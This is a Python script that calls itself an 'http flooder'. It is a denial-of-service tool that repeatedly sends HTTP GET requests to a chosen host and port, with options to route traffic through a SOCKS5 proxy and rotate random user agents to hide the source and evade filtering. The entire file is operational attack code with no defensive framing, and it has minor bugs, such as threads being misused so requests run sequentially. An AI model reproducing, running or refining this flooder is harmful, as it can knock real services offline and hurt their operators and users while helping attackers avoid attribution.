from scapy.all import *
import socket
import threading
from random import *
import sys
import argparse
import time
import socks

def load_agents(name):
        agentlist = []
        with open(name, 'r') as file:
              for i in file.readlines():
                    agentlist.append(i)
        return agentlist

def send_socket(args, agents):
        port = args.port
        dst = socket.gethostbyname(args.host)
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((dst, port))
                if agents == None:
                        s.send((f"GET / HTTP/1.1\nHost: {dst}\n\n").encode('utf-8'))
                else:
                        s.send((f"GET / HTTP/1.1\nHost: {dst}\nUser-Agent: {choice(agents)}\n").encode('utf-8'))

                s.close()
        except Exception as s:
                sys.exit(f'{s}, exiting gracefully')



def flood(args):
        start = time.process_time()
        
        

        if args.useproxy:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxyhost, args.proxyport)
                socket.socket = socks.socksocket
        print('sending packets')

        if args.randagent:
                agents = load_agents('agents.txt')
        else:
                agents = None

        for i in range(0, args.packets+1):

                s = threading.Thread(target= send_socket(args, agents))
                s.start()


                print(str(round((i/args.packets)*100, 2))+" %" + " done", end='\r')
                # display(round((i/args.packets)))
                
        end = time.process_time()
        timer = end-start
        print(f'Done in {timer} sec')
        if timer != 0:
                print(f'Sent {args.packets} packets at a rate of {round(args.packets/(timer), 2)} packets/sec')       
        else:
                print(f'Sent {args.packets} instantly')

def display(percentage):
        bar = percentage*10
        bar = round(bar)
        progess = '-'*bar
        extra = ' '*(10-bar)
        print(progess+extra+'|', end='\r')

def main():
        parser = argparse.ArgumentParser(description= 'http flooder programmed in python')
        parser.add_argument("host", help="target ip")
        parser.add_argument(
                '-p',
                help='host port, usually 80 for webservers',
                default=80,
                dest='port',
                type=int
                )
        parser.add_argument(
                '-r',
                help='number of requests to send',
                default= 1,
                dest='packets',
                type=int
                )

                
        parser.add_argument(
                "-x", "--useproxy",
                dest="useproxy",
                action="store_true",
                help="Use a SOCKS5 proxy for connecting",
                )

        parser.add_argument(
                '-H','--proxy-host',
                help='host address of SOCKS5 proxy',
                dest = 'proxyhost',
                type= str
                )

        parser.add_argument(
                '-P','--proxy-port',
                help='host port of SOCKS5 proxy',
                dest = 'proxyport',
                type=int
                )

        parser.add_argument(
                '-ua', '--user-agent', '--user-agents',
                dest='randagent',
                action="store_true",
                help='use a random user agent'
                )

        args = parser.parse_args()
        flood(args)



main()
